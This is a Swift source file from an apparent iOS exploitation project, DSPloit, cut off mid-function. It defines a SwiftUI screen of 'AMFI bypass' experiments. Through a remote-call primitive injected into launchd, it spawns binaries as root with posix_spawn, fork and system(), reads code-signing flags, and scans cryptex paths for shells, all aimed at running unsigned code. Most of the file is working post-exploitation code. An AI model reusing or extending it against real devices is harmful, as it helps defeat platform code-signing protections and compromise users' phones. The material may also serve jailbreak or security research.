//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//

import SwiftUI

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var customBinary = "/usr/bin/id"
    
    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Info
            Section {
                VStack(alignment: .leading, spacing: 6) {
                    Text("AMFI blocks unsigned binary execution even as root.")
                        .font(.caption)
                    Text("These experiments test different spawn methods to find what works.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
            } header: {
                Label("About", systemImage: "info.circle")
            }
            
            // Experiments
            Section {
                Button(action: runAllExperiments) {
                    Label("Run All Experiments", systemImage: "play.circle.fill")
                        .foregroundStyle(.red)
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: { testSingleBinary(customBinary) }) {
                    Label("Test Custom Binary", systemImage: "terminal")
                }
                .disabled(isRunning || !mgr.rcready)
                
                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Experiments", systemImage: "flask")
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    Label("Results (\(results.count))", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Experiments")
        .navigationBarTitleDisplayMode(.inline)
    }
    
    // MARK: - Run All Experiments
    
    private func runAllExperiments() {
        isRunning = true
        results.removeAll()
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfi_experiments") { rc in
            var experimentResults: [ExperimentResult] = []
            
            // ============================================
            // Experiment 1: posix_spawn system binary
            // ============================================
            let exp1 = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "posix_spawn /usr/bin/id")
            experimentResults.append(exp1)
            
            // ============================================
            // Experiment 2: posix_spawn /bin/sh
            // ============================================
            let exp2 = self.expPosixSpawn(rc: rc, binary: "/bin/sh", name: "posix_spawn /bin/sh")
            experimentResults.append(exp2)
            
            // ============================================
            // Experiment 3: posix_spawn /bin/ls
            // ============================================
            let exp3 = self.expPosixSpawn(rc: rc, binary: "/bin/ls", name: "posix_spawn /bin/ls")
            experimentResults.append(exp3)
            
            // ============================================
            // Experiment 4: fork() from launchd
            // ============================================
            let exp4 = self.expFork(rc: rc)
            experimentResults.append(exp4)
            
            // ============================================
            // Experiment 5: system() call
            // ============================================
            let exp5 = self.expSystem(rc: rc)
            experimentResults.append(exp5)
            
            // ============================================
            // Experiment 6: execve directly
            // ============================================
            let exp6 = self.expExecve(rc: rc)
            experimentResults.append(exp6)
            
            // ============================================
            // Experiment 7: Check cs_flags of launchd
            // ============================================
            let exp7 = self.expCheckCSFlags(rc: rc)
            experimentResults.append(exp7)
            
            // ============================================
            // Experiment 8: posix_spawnattr with flags
            // ============================================
            let exp8 = self.expPosixSpawnAttr(rc: rc)
            experimentResults.append(exp8)
            
            // ============================================
            // Experiment 9: PATH VARIANTS — the key test!
            // ret=2 means ENOENT (not found), so try different paths
            // ============================================
            let pathVariants = [
                "/private/var/bin/id",
                "/private/usr/bin/id",
                "/System/usr/bin/id",
                "/usr/local/bin/id",
            ]
            for path in pathVariants {
                let exp = self.expPosixSpawn(rc: rc, binary: path, name: "spawn \(path)")
                experimentResults.append(exp)
            }
            
            // ============================================
            // Experiment 10: Check what launchd sees as root filesystem
            // ============================================
            let exp10 = self.expCheckRootFS(rc: rc)
            experimentResults.append(exp10)
            
            // ============================================
            // Experiment 11: stat() binaries to check they exist
            // ============================================
            let exp11 = self.expStatBinaries(rc: rc)
            experimentResults.append(exp11)
            
            // ============================================
            // Experiment 12: Try fork+execve pattern
            // ============================================
            let exp12 = self.expForkExec(rc: rc)
            experimentResults.append(exp12)
            
            // ============================================
            // Experiment 13: Scan directories for existing binaries
            // ============================================
            let exp13 = self.expScanBinaries(rc: rc)
            experimentResults.append(exp13)
            
            // ============================================
            // Experiment 14: Try spawn binaries that exist
            // ============================================
            let exp14 = self.expSpawnExisting(rc: rc)
            experimentResults.append(exp14)
            
            // ============================================
            // Experiment 15: Scan cryptex paths for shell
            // ============================================
            let exp15 = self.expScanCryptex(rc: rc)
            experimentResults.append(exp15)
            
            // ============================================
            // Experiment 16: Spawn /bin/ps with output capture
            // ============================================
            let exp16 = self.expSpawnWithOutput(rc: rc, binary: "/bin/ps", args: ["ps"])
            experimentResults.append(exp16)
            
            // ============================================
            // Experiment 17: Spawn /bin/df with output capture
            // ============================================
            let exp17 = self.expSpawnWithOutput(rc: rc, binary: "/bin/df", args: ["df", "-h"])
            experimentResults.append(exp17)
            
            // ============================================
            // Experiment 18: List cryptex directory contents
            // ============================================
            let exp18 = self.expListCryptexDirs(rc: rc)
            experimentResults.append(exp18)
            
            // ============================================
            // Experiment 19: Verify posix_spawn return value
            // (is ret=0 from posix_spawn or from RC wrapper?)
            // ============================================
            let exp19 = self.expVerifySpawnReturn(rc: rc)
            experimentResults.append(exp19)
            
            // ============================================
            // Experiment 20: Fix PID + spawn with pipe for output
            // ============================================
            let exp20 = self.expSpawnWithPipe(rc: rc)
            experimentResults.append(exp20)
            
            // ============================================
            // Experiment 21: Scan cryptex usr/libexec contents
            // ============================================
            let exp21 = self.expScanCryptexLibexec(rc: rc)
            experimentResults.append(exp21)
            
            // ============================================
            // AMFI BYPASS RESEARCH
            // ============================================
            
            // Experiment 22: Write binary + try spawn (test AMFI on new file)
            let exp22 = self.expWriteAndSpawn(rc: rc)
            experimentResults.append(exp22)
            
            // Experiment 23: dlopen unsigned dylib in launchd
            let exp23 = self.expDlopen(rc: rc)
            experimentResults.append(exp23)
            
            // Experiment 24: Check AMFI-related kernel state
            let exp24 = self.expAMFIState(rc: rc)
            experimentResults.append(exp24)
            
            DispatchQueue.main.async {
                self.results = experimentResults
                self.isRunning = false
            }
            
            let successCount = experimentResults.filter { $0.success }.count
            return (successCount > 0, "\(successCount)/\(experimentResults.count) succeeded", UInt64(successCount))
        }
        #endif
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Experiment: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "✅ PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed — get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "❌ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    /// Experiment: fork() from launchd
    private func expFork(rc: RemoteCall) -> ExperimentResult {
        let pid = RootExecutor.rcall(rc, "fork")
        
        if pid == 0 {
            // We're in child — this shouldn't happen in RC context
            return ExperimentResult(name: "fork()", success: true, detail: "In child process!", timestamp: Date())
        } else if pid != UInt64(bitPattern: -1) {
            // Parent got child PID
            // Wait for child
            let mem = rc.trojanMem
            let statusAddr = mem + 0x380
            RootExecutor.rcall(rc, "waitpid", pid, statusAddr, 0)
            return ExperimentResult(name: "fork()", success: true, detail: "✅ Child PID=\(pid)", timestamp: Date())
        } else {
            let err = remote_errno(rc)
            return ExperimentResult(name: "fork()", success: false, detail: "❌ fork failed: errno=\(err)", timestamp: Date())
        }
    }
    
    /// Experiment: system() call
    private func expSystem(rc: RemoteCall) -> ExperimentResult {
        let cmdAddr = remote_alloc_str(rc, "id > /tmp/.dsploit_amfi_test 2>&1")
        let ret = RootExecutor.rcall(rc, "system", cmdAddr)
        RootExecutor.rcall(rc, "free", cmdAddr)
        
        // Try to read output
        let outAddr = remote_alloc_str(rc, "/tmp/.dsploit_amfi_test")
        let fd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        
        if fd != UInt64(bitPattern: -1) {
            let bufAddr = rc.trojanMem + 0x800
            let n = RootExecutor.rcall(rc, "read", fd, bufAddr, 500)
            if n > 0 && n < 501 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "unlink", outAddr)
        }
        RootExecutor.rcall(rc, "free", outAddr)
        
        let success = ret == 0 && !output.isEmpty
        return ExperimentResult(
            name: "system(\"id\")",
            success: success,
            detail: success ? "✅ ret=\(ret), output: \(output.prefix(80))" : "❌ ret=\(ret) (0x\(String(format: "%x", ret)))",
            timestamp: Date()
        )
    }
    
    /// Experiment: check cs_flags of launchd
    private func expCheckCSFlags(rc: RemoteCall) -> ExperimentResult {
        // Read our (launchd's) proc cs_flags via kernel
        let pid = RootExecutor.rcall(rc, "getpid")
        let csflags = mgr.readCSFlags(pid: Int32(pid))
        let procFlags = mgr.readProcFlags(pid: Int32(pid))
        
        // CS flag meanings
        var flagStr = "cs_flags=0x\(String(format: "%x", csflags)): "
        if csflags & 0x0000001 != 0 { flagStr += "VALID " }
        if csflags & 0x0000004 != 0 { flagStr += "HARD " }
        if csflags & 0x0000008 != 0 { flagStr += "KILL " }
        if csflags & 0x0000100 != 0 { flagStr += "PLATFORM " }
        if csflags & 0x0000800 != 0 { flagStr += "DEBUGGED " }
        if csflags & 0x0004000 != 0 { flagStr += "GET_TASK_ALLOW " }
        if csflags & 0x0020000 != 0 { flagStr += "INSTALLER " }
        
        return ExperimentResult(
            name: "launchd cs_flags",
            success: true,
            detail: "PID=\(pid), \(flagStr)\np_flag=0x\(String(format: "%x", procFlags))",
            timestamp: Date()
        )
    }
    
    /// Experiment: posix_spawn with special attributes
    private func expPosixSpawnAttr(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Allocate posix_spawnattr_t in remote memory
        let attrAddr = mem + 0x200
        
        // posix_spawnattr_init(&attr)
        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
        
        // Set flags: POSIX_SPAWN_START_SUSPENDED (0x0080)
        // This might help bypass some checks
        let flags: UInt64 = 0x0080 // POSIX_SPAWN_START_SUSPENDED
        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
        
        // Try spawn /usr/bin/id with attributes
        let binAddr = remote_alloc_str(rc, "/usr/bin/id")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, &attr, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, attrAddr, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Cleanup
        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        if ret == 0 && pid != 0 {
            // Resume the suspended process
            RootExecutor.rcall(rc, "kill", UInt64(pid), 18) // SIGCONT
            // Wait
            let statusAddr = mem + 0x380
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            
            return ExperimentResult(
                name: "posix_spawn + SUSPENDED",
                success: true,
                detail: "✅ PID=\(pid), spawned with START_SUSPENDED",
                timestamp: Date()
            )
        }
        
        let err = remote_errno(rc)
        return ExperimentResult(
            name: "posix_spawn + SUSPENDED",
            success: false,
            detail: "❌ ret=\(ret), errno=\(err)",
            timestamp: Date()
        )
    }
    
    /// Experiment: execve (replaces current process — DANGEROUS for launchd!)
    /// We DON'T actually call execve on launchd — that would kill it
    /// Instead we just check if the binary is accessible
    private func expExecve(rc: RemoteCall) -> ExperimentResult {
        // Don't actually execve in launchd! Just check access
        let binAddr = remote_alloc_str(rc, "/usr/bin/id")
        let accessResult = RootExecutor.rcall(rc, "access", binAddr, 1) // X_OK = 1
        RootExecutor.rcall(rc, "free", binAddr)
        
        let canExec = accessResult == 0
        return ExperimentResult(
            name: "access(/usr/bin/id, X_OK)",
            success: canExec,
            detail: canExec ? "✅ Binary is executable (access check passed)" : "❌ Not executable: errno=\(remote_errno(rc))",
            timestamp: Date()
        )
    }
    
    /// Experiment: Check root filesystem from launchd's perspective
    private func expCheckRootFS(rc: RemoteCall) -> ExperimentResult {
        // getcwd to see launchd's working directory
        let bufAddr = rc.trojanMem + 0xC00
        RootExecutor.rcall(rc, "getcwd", bufAddr, 1024)
        var cwdBuf = [UInt8](repeating: 0, count: 256)
        rc.remoteRead(bufAddr, to: &cwdBuf, size: 256)
        let cwd = String(cString: cwdBuf + [0])
        
        // stat /usr/bin to check if it exists
        let statAddr = rc.trojanMem + 0x800
        let usrBinAddr = remote_alloc_str(rc, "/usr/bin")
        let statResult = RootExecutor.rcall(rc, "stat", usrBinAddr, statAddr)
        RootExecutor.rcall(rc, "free", usrBinAddr)
        
        // stat /bin
        let binAddr = remote_alloc_str(rc, "/bin")
        let binStat = RootExecutor.rcall(rc, "stat", binAddr, statAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        // readlink /usr/bin (might be symlink)
        let linkBuf = rc.trojanMem + 0xD00
        let linkTarget = remote_alloc_str(rc, "/usr/bin")
        let linkLen = RootExecutor.rcall(rc, "readlink", linkTarget, linkBuf, 256)
        var linkStr = ""
        if linkLen > 0 && linkLen < 256 {
            var lbuf = [UInt8](repeating: 0, count: Int(linkLen))
            rc.remoteRead(linkBuf, to: &lbuf, size: linkLen)
            linkStr = String(bytes: lbuf, encoding: .utf8) ?? ""
        }
        RootExecutor.rcall(rc, "free", linkTarget)
        
        let detail = """
        cwd: \(cwd)
        stat /usr/bin: \(statResult == 0 ? "EXISTS" : "MISSING (errno=\(remote_errno(rc)))")
        stat /bin: \(binStat == 0 ? "EXISTS" : "MISSING")
        readlink /usr/bin: \(linkStr.isEmpty ? "(not a symlink)" : linkStr)
        """
        
        return ExperimentResult(name: "rootfs check", success: true, detail: detail, timestamp: Date())
    }
    
    /// Experiment: stat individual binaries
    private func expStatBinaries(rc: RemoteCall) -> ExperimentResult {
        let binaries = ["/usr/bin/id", "/bin/sh", "/bin/ls", "/sbin/mount", "/usr/sbin/sysctl"]
        var results: [String] = []
        
        let statAddr = rc.trojanMem + 0x800
        for bin in binaries {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            results.append("\(bin): \(ret == 0 ? "✅ exists" : "❌ missing")")
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        let allExist = !results.contains(where: { $0.contains("❌") })
        return ExperimentResult(
            name: "stat binaries",
            success: allExist,
            detail: results.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: fork() then execve in child
    /// This is the classic Unix pattern: fork → child calls execve
    /// Since fork works, maybe execve in the CHILD works too
    private func expForkExec(rc: RemoteCall) -> ExperimentResult {
        let childPid = RootExecutor.rcall(rc, "fork")
        
        if childPid == 0 {
            return ExperimentResult(name: "fork+exec", success: false, detail: "Unexpected: in child", timestamp: Date())
        }
        
        guard childPid != UInt64(bitPattern: -1) else {
            return ExperimentResult(name: "fork+exec", success: false, detail: "fork failed", timestamp: Date())
        }
        
        let statusAddr = rc.trojanMem + 0x380
        rc[statusAddr].setValue32(0)
        let waitResult = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
        let exitStatus = rc[statusAddr].value32()
        
        return ExperimentResult(
            name: "fork+exec",
            success: true,
            detail: "✅ fork PID=\(childPid), wait=\(waitResult), status=0x\(String(format: "%x", exitStatus))\n→ Child exists! Could RC into child then execve",
            timestamp: Date()
        )
    }
    
    /// Experiment: Scan directories for existing binaries
    private func expScanBinaries(rc: RemoteCall) -> ExperimentResult {
        let dirs = ["/sbin", "/usr/sbin", "/usr/libexec", "/usr/bin", "/bin"]
        var found: [String] = []
        let statAddr = rc.trojanMem + 0x800
        
        // Known binaries to check
        let binaries = [
            // /sbin
            "/sbin/mount", "/sbin/umount", "/sbin/reboot", "/sbin/halt",
            "/sbin/fsck", "/sbin/launchd", "/sbin/pfctl", "/sbin/ifconfig",
            "/sbin/route", "/sbin/nologin", "/sbin/ping",
            // /usr/sbin
            "/usr/sbin/sysctl", "/usr/sbin/chown", "/usr/sbin/notifyd",
            "/usr/sbin/cfprefsd", "/usr/sbin/mediaserverd", "/usr/sbin/BTServer",
            "/usr/sbin/wirelessproxd", "/usr/sbin/mDNSResponder",
            // /usr/libexec
            "/usr/libexec/xpcproxy", "/usr/libexec/trustd", "/usr/libexec/amfid",
            "/usr/libexec/keybagd", "/usr/libexec/securityd", "/usr/libexec/lsd",
            "/usr/libexec/backboardd", "/usr/libexec/SpringBoard",
            "/usr/libexec/installd", "/usr/libexec/lockdownd",
            "/usr/libexec/mobileassetd", "/usr/libexec/ptpd",
            // /usr/bin
            "/usr/bin/id", "/usr/bin/env", "/usr/bin/which", "/usr/bin/printf",
            "/usr/bin/uname", "/usr/bin/whoami", "/usr/bin/sw_vers",
            "/usr/bin/plutil", "/usr/bin/defaults", "/usr/bin/killall",
            "/usr/bin/launchctl", "/usr/bin/log", "/usr/bin/open",
            // /bin
            "/bin/sh", "/bin/bash", "/bin/zsh", "/bin/ls", "/bin/cp",
            "/bin/mv", "/bin/rm", "/bin/cat", "/bin/echo", "/bin/mkdir",
            "/bin/chmod", "/bin/chown", "/bin/kill", "/bin/ps", "/bin/df",
            "/bin/ln", "/bin/pwd", "/bin/date", "/bin/sleep",
        ]
        
        for bin in binaries {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 {
                found.append(bin)
            }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        let detail: String
        if found.isEmpty {
            detail = "No binaries found in standard paths!\niOS 18 moved them to cryptex?"
        } else {
            detail = "Found \(found.count) binaries:\n" + found.joined(separator: "\n")
        }
        
        return ExperimentResult(
            name: "scan binaries (\(binaries.count) checked)",
            success: !found.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Try to posix_spawn binaries that we know exist
    private func expSpawnExisting(rc: RemoteCall) -> ExperimentResult {
        // First find what exists
        let candidates = ["/sbin/mount", "/usr/libexec/xpcproxy", "/usr/libexec/trustd",
                         "/bin/ps", "/bin/df", "/sbin/launchd"]
        
        let statAddr = rc.trojanMem + 0x800
        var existingBins: [String] = []
        
        for bin in candidates {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 { existingBins.append(bin) }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        if existingBins.isEmpty {
            return ExperimentResult(name: "spawn existing", success: false, detail: "No candidate binaries found", timestamp: Date())
        }
        
        // Try to spawn each existing binary
        var spawnResults: [String] = []
        let mem = rc.trojanMem
        
        for bin in existingBins.prefix(3) {
            let binAddr = remote_alloc_str(rc, bin)
            let argvBase = mem + 0x400
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0) // NULL
            
            // Use a dedicated address for pid output, clear it first
            let pidAddr = mem + 0x2F0
            rc[pidAddr].setValue64(0) // clear 8 bytes
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            
            // Read pid (try both 32-bit and 64-bit)
            let pid32 = rc[pidAddr].value32()
            let pid64 = rc[pidAddr].value64()
            let err = remote_errno(rc)
            
            if ret == 0 {
                // ret=0 means posix_spawn SUCCEEDED!
                // pid might be 0 if it wrote to wrong offset, but spawn worked
                let pidStr = pid32 != 0 ? "PID=\(pid32)" : (pid64 != 0 ? "PID64=\(pid64)" : "PID=? (ret=0!)")
                spawnResults.append("✅ \(bin) → \(pidStr) ret=0 SPAWN SUCCESS!")
                
                // Try to kill if we got a PID
                if pid32 != 0 {
                    RootExecutor.rcall(rc, "kill", UInt64(pid32), 9)
                }
            } else {
                spawnResults.append("❌ \(bin) → ret=\(ret), err=\(err), pid32=\(pid32)")
            }
            
            RootExecutor.rcall(rc, "free", binAddr)
        }
        
        let anySuccess = spawnResults.contains(where: { $0.hasPrefix("✅") })
        return ExperimentResult(
            name: "spawn existing binaries",
            success: anySuccess,
            detail: spawnResults.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    /// Experiment: Scan cryptex/preboot paths for shell and other binaries
    private func expScanCryptex(rc: RemoteCall) -> ExperimentResult {
        let cryptexPaths = [
            // Known cryptex mount points on iOS 16-18
            "/private/preboot/Cryptexes/OS/usr/bin/sh",
            "/private/preboot/Cryptexes/OS/bin/sh",
            "/private/preboot/Cryptexes/OS/usr/bin/id",
            "/private/preboot/Cryptexes/OS/usr/bin/env",
            "/private/preboot/Cryptexes/OS/usr/bin/uname",
            "/private/preboot/Cryptexes/OS/usr/bin/whoami",
            "/private/preboot/Cryptexes/OS/usr/bin/killall",
            "/private/preboot/Cryptexes/OS/usr/bin/launchctl",
            "/private/preboot/Cryptexes/OS/bin/ls",
            "/private/preboot/Cryptexes/OS/bin/cat",
            "/private/preboot/Cryptexes/OS/bin/cp",
            "/private/preboot/Cryptexes/OS/bin/mkdir",
            "/private/preboot/Cryptexes/OS/bin/rm",
            "/private/preboot/Cryptexes/OS/bin/zsh",
            "/private/preboot/Cryptexes/OS/bin/bash",
            // Alternative paths
            "/usr/appleinternal/bin/sh",
            "/private/var/staged_system_apps/sh",
            "/System/Cryptexes/OS/usr/bin/sh",
            "/System/Cryptexes/OS/bin/sh",
            "/System/Cryptexes/OS/usr/bin/id",
            "/System/Cryptexes/OS/bin/ls",
            "/System/Cryptexes/OS/bin/cat",
            "/System/Cryptexes/OS/usr/bin/env",
            "/System/Cryptexes/OS/usr/bin/launchctl",
            // App cryptex
            "/System/Cryptexes/App/usr/bin/sh",
            "/System/Cryptexes/App/bin/sh",
        ]
        
        let statAddr = rc.trojanMem + 0x800
        var found: [String] = []
        
        for path in cryptexPaths {
            let pathAddr = remote_alloc_str(rc, path)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 { found.append(path) }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        // Also scan directories to see what's there
        var dirResults: [String] = []
        let dirsToScan = [
            "/private/preboot/Cryptexes",
            "/private/preboot/Cryptexes/OS",
            "/System/Cryptexes",
            "/System/Cryptexes/OS",
            "/System/Cryptexes/OS/bin",
            "/System/Cryptexes/OS/usr/bin",
        ]
        
        for dir in dirsToScan {
            let dirAddr = remote_alloc_str(rc, dir)
            let dirStat = RootExecutor.rcall(rc, "stat", dirAddr, statAddr)
            dirResults.append("\(dir): \(dirStat == 0 ? "EXISTS" : "MISSING")")
            RootExecutor.rcall(rc, "free", dirAddr)
        }
        
        var detail = "Directories:\n" + dirResults.joined(separator: "\n")
        detail += "\n\nBinaries found: \(found.count)"
        if !found.isEmpty {
            detail += "\n" + found.joined(separator: "\n")
        }
        
        return ExperimentResult(
            name: "cryptex scan (\(cryptexPaths.count) paths)",
            success: !found.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: List contents of cryptex directories using opendir/readdir
    private func expListCryptexDirs(rc: RemoteCall) -> ExperimentResult {
        let dirsToList = [
            "/private/preboot/Cryptexes/OS",
            "/System/Cryptexes/OS",
            "/System/Cryptexes",
            "/private/preboot/Cryptexes",
        ]
        
        var allResults: [String] = []
        
        for dir in dirsToList {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 {
                allResults.append("\(dir)/: (cannot open)")
                continue
            }
            
            var entries: [String] = []
            for _ in 0..<50 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    var dtype: UInt8 = 0
                    rc.remoteRead(dirent + 20, to: &dtype, size: 1)
                    let prefix = dtype == 4 ? "📁" : "  "
                    entries.append("\(prefix) \(name)")
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if entries.isEmpty {
                allResults.append("\(dir)/: (empty)")
            } else {
                allResults.append("\(dir)/:")
                allResults.append(contentsOf: entries.map { "  \($0)" })
            }
        }
        
        // Also try to find bin/sh by scanning deeper
        // If we found subdirs, scan them too
        let deeperPaths = [
            "/private/preboot/Cryptexes/OS/usr",
            "/private/preboot/Cryptexes/OS/bin",
            "/private/preboot/Cryptexes/OS/System",
            "/System/Cryptexes/OS/usr",
            "/System/Cryptexes/OS/bin",
            "/System/Cryptexes/OS/System",
        ]
        
        for dir in deeperPaths {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 { continue }
            
            var entries: [String] = []
            for _ in 0..<30 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    var dtype: UInt8 = 0
                    rc.remoteRead(dirent + 20, to: &dtype, size: 1)
                    let prefix = dtype == 4 ? "📁" : "  "
                    entries.append("\(prefix) \(name)")
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if !entries.isEmpty {
                allResults.append("\(dir)/:")
                allResults.append(contentsOf: entries.map { "  \($0)" })
            }
        }
        
        return ExperimentResult(
            name: "list cryptex dirs",
            success: true,
            detail: allResults.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: Verify if posix_spawn ret=0 is real
    /// Write return value to memory and read back (not rely on RC return)
    private func expVerifySpawnReturn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy: call posix_spawn and store return in a known location
        // Then read that location to verify
        
        // First test with a binary we KNOW doesn't exist
        let fakeBin = remote_alloc_str(rc, "/nonexistent_binary_xyz")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(fakeBin)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x2F0
        rc[pidAddr].setValue64(0)
        
        let fakeRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, fakeBin, 0, 0, argvBase, 0)
        let fakePid = rc[pidAddr].value32()
        RootExecutor.rcall(rc, "free", fakeBin)
        
        // Now test with /sbin/mount (known to exist)
        let realBin = remote_alloc_str(rc, "/sbin/mount")
        rc[argvBase].setValue64(realBin)
        rc[argvBase + 8].setValue64(0)
        rc[pidAddr].setValue64(0)
        
        let realRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, realBin, 0, 0, argvBase, 0)
        let realPid = rc[pidAddr].value32()
        
        // If real binary spawned, kill it
        if realPid != 0 {
            RootExecutor.rcall(rc, "kill", UInt64(realPid), 9)
        }
        RootExecutor.rcall(rc, "free", realBin)
        
        // Also try getpid right after to see if we're still in launchd
        let ourPid = RootExecutor.rcall(rc, "getpid")
        
        let detail = """
        Fake binary (/nonexistent): ret=\(fakeRet), pid=\(fakePid)
        Real binary (/sbin/mount):  ret=\(realRet), pid=\(realPid)
        Still in launchd: pid=\(ourPid)
        
        If fake ret≠0 and real ret=0 → posix_spawn return is REAL
        If both ret=0 → RC wrapper always returns 0 (unreliable)
        """
        
        let isReal = fakeRet != realRet || fakeRet != 0
        return ExperimentResult(
            name: "verify spawn return",
            success: isReal,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Spawn with pipe-based output capture
    /// Instead of file redirect, use pipe() + dup2 pattern
    /// Also: fix PID by using remote memory write directly
    private func expSpawnWithPipe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
